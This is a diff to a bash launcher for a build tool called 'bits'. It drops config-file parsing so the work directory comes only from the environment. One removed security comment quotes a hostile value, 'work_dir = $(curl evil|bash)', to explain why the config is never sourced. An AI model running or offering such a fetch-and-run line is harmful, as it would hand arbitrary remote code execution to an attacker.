@@ -21,9 +21,9 @@ fi
 
 ARGV=("$@"); ARGC=$#   # ARGC must be a plain integer, not an array
 
-# `bits preload …` MUST be handled before the global `--config` pre-parse below,
-# which would otherwise swallow preload's own `--config <yaml>` (a name clash with
-# the bits.rc `--config`). Post-publish CVMFS filebundle generator: traces the
+# `bits preload …` is handled up-front (before module/dispatch setup) so its own
+# `--config <yaml>` is not consumed by later processing. Post-publish CVMFS
+# filebundle generator: traces the
 # deployed tests (strace, optionally --docker) and writes .cvmfsbundle-* into one
 # tar. Self-contained; needs no work dir. Uses the raw ARGV, unmangled.
 if [[ "${ARGV[0]:-}" == "preload" ]]; then
@@ -293,101 +293,17 @@ function _bt_mark() {
   _BT_PREV="$now"
 }
 
-function readBitsRc() {
-  # SECURITY: never source the config file (a crafted value like
-  # work_dir = $(curl evil|bash) would execute). The launcher itself needs only
-  # the work directory for module operations; every other bits.rc setting
-  # (config_dir, architecture, defaults, organisation, providers, ...) is read
-  # by the Python layer in bits_helpers/args.py. Extract work_dir with awk —
-  # flat "work_dir = value" or a value inside a leading [bits] section both
-  # work; sw_dir is accepted as a deprecated alias.
-  local cfgfile="$1"
-  [[ -f "$cfgfile" ]] || return 0
-  work_dir="$(awk '
-    { line=$0; sub(/^[[:space:]]*/,"",line); sub(/[[:space:]]*$/,"",line)
-      if (line ~ /^(work_dir|sw_dir)[[:space:]]*=/) {
-        sub(/^(work_dir|sw_dir)[[:space:]]*=[[:space:]]*/,"",line)
-        print line; exit } }' "$cfgfile")"
-  return 0
-}
-
-function checkLegacyBitsRc() {
-  # The bits.rc format was simplified. Reject old-style files loudly rather
-  # than silently ignoring renamed/removed keys. Old markers: the deprecated
-  # keys below, or any section other than [bits].
-  local cfgfile="$1"
-  [[ -f "$cfgfile" ]] || return 0
-  local bad
-  bad="$(awk '
-    /^[[:space:]]*\[/ {
-      if ($0 !~ /^[[:space:]]*\[bits\][[:space:]]*$/) { print "  section " $0 } ; next }
-    /^[[:space:]]*(repo_dir|sw_dir|pkg_prefix|branding)[[:space:]]*=/ {
-      k=$0; sub(/^[[:space:]]*/,"",k); sub(/[[:space:]]*=.*/,"",k); print "  key    " k }
-  ' "$cfgfile")"
-  [[ -z "$bad" ]] && return 0
-  {
-    echo "ERROR: $cfgfile uses the old bits.rc format. Offending entries:"
-    echo "$bad"
-    echo
-    echo "Please update it (a flat key = value file, or a single [bits] section):"
-    echo "  repo_dir     -> config_dir"
-    echo "  sw_dir       -> work_dir"
-    echo "  pkg_prefix   -> removed; the display prefix comes from the aliBuild wrapper (BITS_PKG_PREFIX)"
-    echo "  branding     -> removed"
-    echo "(search_path is still supported: it seeds BITS_PATH so recipes in a"
-    echo " sub-repo such as ./lcg.bits are found, e.g. for 'bits build ROOT'.)"
-    echo "Per-organisation [NAME] sections are no longer supported."
-    echo
-    echo "Example:"
-    echo "  organisation = stacks"
-    echo "  config_dir   = ."
-    echo "  search_path  = lcg"
-  } >&2
-  exit 1
-}
-
 function configBits() {
-  # Backward-compatibility default for the work directory. NOTE: the display
-  # prefix (BITS_PKG_PREFIX) and branding come from the ENVIRONMENT only — the
-  # aliBuild wrapper exports them for ALICE-style "VO_ALICE@pkg::ver" output;
-  # an empty BITS_PKG_PREFIX makes `bits q` print the native "<pkg>/<version>".
-  # organisation (registry/provider selection) and all other settings are
-  # handled by the Python layer, not here.
-  BITS_WORK_DIR=${BITS_WORK_DIR:-"sw"}
-
-  cfile=""
-  for cfg in "$1" bits.rc .bitsrc "$HOME/.bitsrc"
-  do
-    [[ -n "$cfg" && -f "$cfg" ]] && { cfile="$cfg"; break; }
-  done
-
-  local work_dir=
-  [[ -n "$cfile" ]] && checkLegacyBitsRc "$cfile"
-  [[ -n "$cfile" ]] && readBitsRc "$cfile"
-
-  export BITS_WORK_DIR=${work_dir:-$BITS_WORK_DIR}
+  # The work-directory default plus the display prefix (BITS_PKG_PREFIX) and
+  # branding come from the ENVIRONMENT only — the aliBuild wrapper exports them
+  # for ALICE-style "VO_ALICE@pkg::ver" output; an empty BITS_PKG_PREFIX makes
+  # `bits q` print the native "<pkg>/<version>". config_dir/architecture/
+  # providers/... are handled by the Python layer (-w overrides BITS_WORK_DIR).
+  export BITS_WORK_DIR=${BITS_WORK_DIR:-"sw"}
   export BITS_PKG_PREFIX=${BITS_PKG_PREFIX:-}
 }
 
-config_file=""
-
-for ((i=0;i<$ARGC;i++)); do
-    arg=${ARGV[$i]}
-    opt=${arg%%=*}
-    val=${arg##*=}
-    case $opt in
-       --config)
-          config_file=$val
-       ;;
-       *)
-         new_args+=("$arg")
-         ;;
-   esac
-done
-
-configBits "$config_file"
-
-set -- "${new_args[@]}"
+configBits
 
 # `bits store …` → bitsStore (S3 content-store inspection, verification, cleanup).
 # Handled before work-dir/module setup: the store tool talks to S3, not the local
@@ -470,17 +386,6 @@ else
   EY=
   EZ=
 fi
-
-# If out of bits build directory, invoke bitsenv
-
-#if [ ! -f .bitsrc -a ! -f bits.rc ]
-#then
-#   bitsenv=`which bitsenv`
-#   if [ ! -z $bitsenv ]
-#   then
-#      exec $bitsenv $@
-#   fi
-#fi
 
 # My operating system
 
